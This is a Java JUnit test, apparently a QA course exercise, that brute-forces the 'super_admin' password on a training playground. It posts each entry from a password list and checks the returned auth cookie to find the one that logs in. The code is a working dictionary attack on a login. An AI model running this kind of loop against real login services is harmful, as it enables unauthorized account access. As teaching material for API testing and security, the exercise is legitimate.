import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.HashMap;
import java.util.Map;

public class ExerciseNine {

    @Test
    public void AuthorizationWithoutPassword() {
        String baseUrl = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        ListPassword listPassword = new ListPassword();
        String[] passwords = listPassword.getPassword();


        for (int i = 0; i < passwords.length; i++) {

            Map<String, Object> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", passwords[i]);

            Response response = RestAssured
                    .given()
                    .contentType(ContentType.JSON)
                    .body(data)
                    .when()
                    .post(baseUrl)
                    .andReturn();

            Map<String, Object> cookie = new HashMap<>();
            cookie.put("auth_cookie", response.getCookie("auth_cookie"));

            response = RestAssured
                    .given()
                    .contentType(ContentType.JSON)
                    .body(data)
                    .cookies(cookie)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            if (!response.htmlPath().getString("body").equals("You are NOT authorized")) {
                System.out.println(response.htmlPath().getString("body"));
                System.out.println(passwords[i]);
           }
        }

    }
}
